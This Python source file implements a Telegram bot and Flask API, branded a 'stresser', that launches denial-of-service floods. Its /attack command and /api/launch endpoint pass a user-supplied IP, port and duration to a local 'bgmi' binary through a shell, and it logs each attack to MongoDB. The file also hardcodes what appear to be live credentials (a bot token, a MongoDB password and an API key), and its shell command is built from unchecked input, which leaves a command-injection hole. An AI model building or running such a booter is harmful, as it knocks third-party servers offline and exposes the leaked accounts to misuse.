import asyncio
import logging
import subprocess
import threading
import os
import socket
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from flask import Flask, request, jsonify
from telegram import Update
from telegram.ext import Application, CommandHandler, filters, ContextTypes
from pymongo import MongoClient, DESCENDING
import uuid
from dotenv import load_dotenv

# --- FLASK API SETUP ---
api_app = Flask(__name__)

# --- CONFIGURATION ---
BOT_TOKEN = "8749691844:AAGNM0JIB5nHhVgZo2TXpbew919WKSGbt1o"
MONGODB_URI = "mongodb+srv://manasdev314_db_user:Ravirao226008@sastadev.pa9pfjb.mongodb.net/?appName=Sastadev"
DATABASE_NAME = "sastadev"
API_URL = "https://api.battle-destroyer.shop"
API_KEY = "ak_e09b114844018935feffc"
ADMIN_IDS = [8787952549]
BLOCKED_PORTS = [80, 443, 22, 8080] # Example blocked ports

# Logging Setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Ensure Binary Permissions
if os.path.exists("./bgmi"):
    os.system("chmod +x bgmi")

# Helper functions for logs
def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "Not Detected"

def get_blocked_ports_list():
    return ", ".join(map(str, BLOCKED_PORTS))

# MongoDB Setup
try:
    client = MongoClient(MONGODB_URI)
    db = client[DATABASE_NAME]
    users_col = db.users
    attacks_col = db.attacks
except Exception as e:
    print(f"❌ [DATABASE ERROR] {e}")

# --- API ENDPOINT FOR YOUR APP ---
@api_app.route('/api/launch', methods=['POST'])
def api_launch():
    data = request.json
    received_key = request.headers.get("x-api-key")
    
    if received_key != API_KEY:
        return jsonify({"success": False, "error": "Unauthorized Access"}), 403

    target = data.get('ip')
    port = data.get('port')
    duration = data.get('duration')

    if not target or not port or not duration:
        return jsonify({"success": False, "error": "Missing params"}), 400

    try:
        print(f"🚀 [APP ATTACK] Target: {target} | Port: {port} | Time: {duration}s")
        cmd = f"./bgmi {target} {port} {duration} 64"
        subprocess.Popen(cmd, shell=True)
        
        attacks_col.insert_one({
            "target": target, "port": port, "duration": duration,
            "source": "App Dashboard", "timestamp": datetime.now(timezone.utc)
        })
        return jsonify({"success": True, "message": f"Attack started on {target}"}), 200
    except Exception as e:
        print(f"❌ [ERROR] App Attack Failed: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

# --- TELEGRAM BOT COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not users_col.find_one({"user_id": user_id}):
        users_col.insert_one({"user_id": user_id, "joined": datetime.now()})
    await update.message.reply_text("💀 **SASTA DEV STRESSER ACTIVE**\n/attack <ip> <port> <time>")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Access Denied!")
        return

    if len(context.args) < 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return

    ip, port, duration = context.args[0], context.args[1], context.args[2]
    
    try:
        print(f"🔥 [TG ATTACK] User: {user_id} | Target: {ip}:{port} | Duration: {duration}s")
        cmd = f"./bgmi {ip} {port} {duration} 64"
        subprocess.Popen(cmd, shell=True)
        
        attacks_col.insert_one({
            "user_id": user_id, "target": ip, "port": port, "duration": duration,
            "source": "Telegram", "timestamp": datetime.now(timezone.utc)
        })
        await update.message.reply_text(f"🚀 Attack Dispatched to {ip}:{port}")
    except Exception as e:
        print(f"❌ [ERROR] TG Attack Failed: {e}")
        await update.message.reply_text(f"❌ Error: {e}")

# --- SERVER RUNNERS ---
def run_flask():
    port = int(os.environ.get("PORT", 5000))
    api_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

def main():
    # 1. Server IP and Setup
    server_ip = get_public_ip()
    
    # 2. Setup Bot
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack_command))
    
    # 3. Run API Server
    threading.Thread(target=run_flask, daemon=True).start()
    
    # 4. Start Bot with Custom Startup Logs
    print("\n" + "="*50)
    print("🤖 Bot is starting...")
    print(f"🌐 Server IP: {server_ip}")
    print(f"📊 MongoDB: Connected and indexes optimized.")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"🔗 API URL: {API_URL}")
    print(f"🔑 API Key: {API_KEY[:10]}...")
    print(f"🚫 Blocked Ports: {get_blocked_ports_list()}")
    print("✅ Bot is running!")
    print("="*50 + "\n")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
